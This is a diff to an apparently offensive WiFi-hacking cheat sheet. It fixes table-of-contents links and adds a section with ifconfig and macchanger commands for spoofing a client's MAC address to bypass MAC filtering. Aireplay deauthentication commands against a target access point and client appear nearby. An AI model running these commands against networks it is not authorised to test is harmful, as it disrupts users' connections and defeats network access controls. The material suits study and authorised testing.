@@ -7,9 +7,9 @@
     * [MAC address changing](#MAC-address-changing)
     * [Deauthenticating All Clients From Protected WiFi Network](#Deauthenticating-All-Clients-From-Protected-WiFi-Network)
     * [Deauthenticating a Client From Protected WiFi Networks](#Deauthenticating-a-Client-From-Protected-WiFi-Networks)
-  * [Gaining Access](#encryption-attack)
+  * [Gaining Access](#Gaining-Access)
     * [Discovering Names of Hidden Networks](#Discovering-Names-of-Hidden-Networks)
-    * [Bypass MAC filtering](#wps)
+    * [Bypassing Mac Filtering (Blacklists & Whitelists)](#Bypassing Mac Filtering (Blacklists & Whitelists))
     * [Captive portals](#others)
 	* [WEP ](#others)
 	* [WPA ](#others)
@@ -60,4 +60,9 @@
 ```Bash
   > airodump-ng --bssid 44:55:tt:ee:ee:bb --channel 6 wlan0
   > airoplay-ng --deauth 4 -a 44:55:tt:ee:ee:bb -c 22:dd:33:44:55:66 wlan0  
+  ```
+ ### Bypassing Mac Filtering (Blacklists & Whitelists)
+```Bash
+  > ifconfig wlan0 down
+  > macchanger -m 22:dd:33:44:55:66 wlan0  
   ```
